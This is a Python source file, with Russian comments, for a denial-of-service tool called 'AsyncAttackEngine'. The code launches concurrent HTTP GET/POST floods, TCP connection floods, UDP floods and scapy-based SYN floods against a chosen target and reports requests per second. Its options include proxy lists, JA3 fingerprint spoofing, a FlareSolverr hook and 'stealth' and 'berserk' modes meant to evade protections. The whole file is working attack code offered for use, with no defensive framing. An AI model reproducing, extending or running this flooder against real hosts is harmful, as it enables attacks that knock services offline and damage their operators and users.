#!/usr/bin/env python3
import asyncio, aiohttp, random, time, json, socket, ssl, threading
from urllib.parse import urlparse

class AsyncAttackEngine:
    def __init__(self, proxy_list=None, port=80, obfuscate=True, jitter=0,
                 flare_solverr_url=None, ja3_profile=None, stealth=False,
                 browser_storm=False, use_h2=False, adaptive=False,
                 random_ja3=False, smart_flood=False, berserk=False,
                 l4_method=None, udp_random_size=False):
        self.target = None
        self.port = port
        self.method = "GET"
        self.threads = 100
        self.running = False
        self.proxy_list = proxy_list or []
        self.obfuscate = obfuscate
        self.jitter = jitter
        self.flare_solverr_url = flare_solverr_url
        self.ja3_profile = ja3_profile
        self.stealth = stealth
        self.browser_storm = browser_storm
        self.use_h2 = use_h2
        self.adaptive = adaptive
        self.random_ja3 = random_ja3
        self.smart_flood = smart_flood
        self.berserk = berserk
        self.l4_method = l4_method
        self.udp_random_size = udp_random_size
        self.stats = {'count': 0, 'rps': 0, 'errors': 0}
        self._stop_event = asyncio.Event()

    def launch(self, target, method="GET", threads=100, progress_callback=None,
               hybrid=False, l4_method=None):
        self.target = target
        self.method = method.upper()
        self.threads = threads
        self.running = True
        self._stop_event.clear()
        if hybrid and l4_method:
            self.l4_method = l4_method.upper()
        asyncio.run(self._run_attack(progress_callback))

    async def _run_attack(self, progress_callback=None):
        tasks = []
        if self.method in ("TCP", "UDP", "SYN_FLOOD"):
            l4 = self.method
        else:
            l4 = None
        # Запускаем L7 воркеры
        if not l4 and self.method not in ("TCP", "UDP", "SYN_FLOOD"):
            for _ in range(self.threads):
                tasks.append(asyncio.create_task(self._http_worker()))
        # L4 воркеры
        if l4 == "TCP":
            for _ in range(self.threads):
                tasks.append(asyncio.create_task(self._tcp_flood()))
        elif l4 == "UDP":
            for _ in range(self.threads):
                tasks.append(asyncio.create_task(self._udp_flood()))
        elif l4 == "SYN_FLOOD":
            tasks.append(asyncio.create_task(self._syn_flood()))

        # Гибрид: если hybrid=True, добавляем L4 к L7
        if self.l4_method and not l4:
            for _ in range(self.threads // 2):
                if self.l4_method == "TCP":
                    tasks.append(asyncio.create_task(self._tcp_flood()))
                elif self.l4_method == "UDP":
                    tasks.append(asyncio.create_task(self._udp_flood()))

        # Мониторинг
        async def monitor():
            last_count = 0
            while self.running:
                await asyncio.sleep(1)
                current = self.stats['count']
                self.stats['rps'] = current - last_count
                last_count = current
                if progress_callback:
                    progress_callback(self.stats['rps'], current)
        tasks.append(asyncio.create_task(monitor()))

        await asyncio.gather(*tasks, return_exceptions=True)
        self.running = False

    async def _http_worker(self):
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            while self.running:
                try:
                    url = self.target if self.target.startswith('http') else f'http://{self.target}'
                    if self.method == "GET":
                        async with session.get(url, timeout=aiohttp.ClientTimeout(total=2)) as resp:
                            await resp.read()
                    elif self.method == "POST":
                        async with session.post(url, data=b'data', timeout=aiohttp.ClientTimeout(total=2)) as resp:
                            await resp.read()
                    self.stats['count'] += 1
                except:
                    self.stats['errors'] += 1
                if self.jitter:
                    await asyncio.sleep(self.jitter / 1000)

    async def _tcp_flood(self):
        while self.running:
            try:
                _, writer = await asyncio.open_connection(self.target, self.port)
                writer.write(b'\x00' * 1024)
                await writer.drain()
                writer.close()
                self.stats['count'] += 1
            except:
                self.stats['errors'] += 1
            await asyncio.sleep(0.001)

    async def _udp_flood(self):
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running:
            try:
                size = random.randint(64, 1500) if self.udp_random_size else 1024
                sock.sendto(b'\x00' * size, (self.target, self.port))
                self.stats['count'] += 1
            except:
                self.stats['errors'] += 1

    async def _syn_flood(self):
        try:
            from scapy.all import IP, TCP, send
        except ImportError:
            print("Scapy не установлен")
            return
        while self.running:
            pkt = IP(dst=self.target) / TCP(dport=self.port, flags='S')
            send(pkt, verbose=False)
            self.stats['count'] += 1
            await asyncio.sleep(0.001)

    def stop(self):
        self.running = False
        self._stop_event.set()
